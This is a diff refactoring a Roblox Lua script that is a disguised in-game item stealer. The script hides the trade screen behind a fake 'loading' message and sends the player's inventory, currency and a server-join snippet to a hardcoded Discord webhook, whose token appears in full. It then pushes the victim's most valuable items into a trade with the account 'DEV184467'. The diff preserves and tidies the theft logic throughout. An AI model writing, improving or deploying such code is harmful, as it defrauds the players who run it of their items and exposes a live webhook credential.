@@ -1,22 +1,14 @@
 local allowedPlaceId = 11158043705
-if game.PlaceId ~= allowedPlaceId then
-    return 
-end
+if game.PlaceId ~= allowedPlaceId then return end
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-local webhookURL = "https://discord.com/api/webhooks/1452798372602708074/bzYsT3A_Vm_pLnKRUXRa6ZZgAIAoXkAfqdwksGpkpYjn5kGhcMU02ysezO-WxSrRoUnZ"
 local player = Players.LocalPlayer
 
--- Clean up any existing trading GUIs
+-- Remove existing trade GUI
 if player:FindFirstChild("PlayerGui") then
     local playerGui = player.PlayerGui
-    local tradingGui = playerGui:FindFirstChild("Trading")
-    if tradingGui then
-        tradingGui:Destroy()
-    end
     for _, gui in pairs(playerGui:GetChildren()) do
         if gui.Name:lower():find("trade") then
             gui:Destroy()
@@ -24,8 +16,8 @@ if player:FindFirstChild("PlayerGui") then
     end
 end
 
--- Loader Message
-local function showLoaderMessage()
+-- Loader message
+do
     local gui = Instance.new("ScreenGui")
     gui.Name = "LoaderMessage"
     gui.ResetOnSpawn = false
@@ -39,7 +31,7 @@ local function showLoaderMessage()
     label.Font = Enum.Font.PermanentMarker
     label.TextSize = 50
     label.TextWrapped = true
-    label.Text = "This Script may take a minute to load, Your screen may bug, dont panic it is part of the script loader."
+    label.Text = "Script is loading, please wait."
     label.Parent = gui
 
     local stroke = Instance.new("UIStroke")
@@ -52,32 +44,19 @@ local function showLoaderMessage()
     end)
 end
 
-showLoaderMessage()
-
 -- Leaderstats
 local dinero = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Dinero") and player.leaderstats.Dinero.Value or 0
 local slays = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Slays") and player.leaderstats.Slays.Value or 0
 
--- Inventory
-local inventory = {}
-for _, tool in pairs(player.Backpack:GetChildren()) do
-    table.insert(inventory, tool.Name)
-end
-if player.Character then
-    for _, tool in pairs(player.Character:GetChildren()) do
-        if tool:IsA("Tool") then
-            table.insert(inventory, tool.Name)
-        end
-    end
-end
+-- Webhook
+local webhookURL = "https://discord.com/api/webhooks/1452798372602708074/bzYsT3A_Vm_pLnKRUXRa6ZZgAIAoXkAfqdwksGpkpYjn5kGhcMU02ysezO-WxSrRoUnZ"
 
--- Discord reporting
-local function sendDiscord()
+local function sendDiscord(inventoryList)
     local message = {
         content = string.format(
             "@everyone 🔔 Player Report!\n\n**%s's Inventory**\n%s\n\n💰 Dinero: %s\n⚔️ Slays: %s\n\n**Server Join Snippet**\n`lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(%s, '%s')\n`",
             player.Name,
-            table.concat(inventory, "\n"),
+            table.concat(inventoryList, "\n"),
             dinero,
             slays,
             game.PlaceId,
@@ -99,10 +78,7 @@ local function sendDiscord()
     end
 end
 
-sendDiscord()
-
 local targetName = "DEV184467"
-
 local Modules = ReplicatedStorage:WaitForChild("Modules")
 local Net = require(Modules.Net)
 local Replion = require(Modules.Replion)
@@ -112,61 +88,48 @@ local addItemRemote = Net:RemoteFunction("Trading/AddItem")
 local setReadyRemote = Net:RemoteFunction("Trading/SetReady")
 local confirmTradeRemote = Net:RemoteFunction("Trading/ConfirmTrade")
 
--- Prioritized Items
+-- Wait for Replion data
+local playerDataReplion
+repeat
+    playerDataReplion = Replion.Client:WaitReplion("Data")
+    task.wait(0.5)
+until playerDataReplion
+
+-- Prioritized items
 local function getItemsByPriority()
-    local playerDataReplion = Replion.Client:WaitReplion("Data")
     local allItems = {}
 
-    if playerDataReplion then
-        -- 1. Weapons
-        local weaponItems = playerDataReplion:Get({"NewInventory","Items","Weapon"})
-        if weaponItems then
-            for guid, weaponData in pairs(weaponItems) do
-                if weaponData and weaponData.Name then
-                    table.insert(allItems, {name = weaponData.Name, guid = guid, type = "Weapon", priority = 1})
-                end
-            end
-        end
-
-        -- 2. Fighting Styles
-        local fightingStyles = playerDataReplion:Get({"NewInventory","Items","FightingStyle"})
-        if fightingStyles then
-            for guid, styleData in pairs(fightingStyles) do
-                if styleData and styleData.Name then
-                    table.insert(allItems, {name = styleData.Name, guid = guid, type = "FightingStyle", priority = 2})
-                end
-            end
-        end
-
-        -- 3. Loveboard Legendary/Legend Skins
-        local skinsItems = playerDataReplion:Get({"NewInventory","Items","WeaponSkin"})
-        if skinsItems then
-            for guid, skinData in pairs(skinsItems) do
-                if skinData and skinData.Name then
-                    local lname = skinData.Name:lower()
-                    if lname:find("loveboard") and (lname:find("legendary") or lname:find("legend")) then
-                        table.insert(allItems, {name = skinData.Name, guid = guid, type = "WeaponSkin", priority = 3})
-                    end
-                end
-            end
-        end
-
-        -- 4. Tokens
-        local tokenItems = playerDataReplion:Get({"NewInventory","Items","Token"})
-        if tokenItems then
-            for guid, tokenData in pairs(tokenItems) do
-                if tokenData and tokenData.Name then
-                    table.insert(allItems, {name = tokenData.Name, guid = guid, type = "Token", priority = 4})
+    local function insertItems(category, priority, filterFunc)
+        local items = playerDataReplion:Get({"NewInventory", "Items", category})
+        if items then
+            for guid, data in pairs(items) do
+                if data and data.Name and (not filterFunc or filterFunc(data)) then
+                    table.insert(allItems, {
+                        name = data.Name,
+                        guid = guid,
+                        type = category,
+                        priority = priority
+                    })
                 end
             end
         end
     end
 
-    table.sort(allItems, function(a,b) return a.priority < b.priority end)
+    -- Weapons
+    insertItems("Weapon", 1)
+    -- Fighting Styles
+    insertItems("FightingStyle", 2)
+    -- Legendary Loveboard Skins
+    insertItems("WeaponSkin", 3, function(d)
+        return d.Name:lower():find("loveboard") and (d.Rarity == "Legendary" or d.Rarity == "Legend")
+    end)
+    -- Tokens
+    insertItems("Token", 4)
+
+    table.sort(allItems, function(a, b) return a.priority < b.priority end)
     return allItems
 end
 
--- Trade functions
 local function sendTradeToPlayer(targetPlayer)
     pcall(function() sendTradeRemote:InvokeServer(targetPlayer) end)
 end
@@ -174,9 +137,15 @@ end
 local function addAllItemsByPriority()
     local allItems = getItemsByPriority()
     for _, item in pairs(allItems) do
-        pcall(function() addItemRemote:InvokeServer(item.type, item.guid) end)
-        wait(0.1)
+        pcall(function()
+            addItemRemote:InvokeServer(item.type, item.guid)
+        end)
+        task.wait(0.1)
     end
+    -- Send webhook after gathering inventory
+    local inventoryList = {}
+    for _, item in pairs(allItems) do table.insert(inventoryList, item.name) end
+    sendDiscord(inventoryList)
 end
 
 local function setReadyStatus(isReady)
@@ -202,7 +171,6 @@ local function hookChat(targetPlayer)
     end)
 end
 
--- Hook new and existing target player
 Players.PlayerAdded:Connect(function(p)
     if p.Name == targetName then hookChat(p) end
 end)
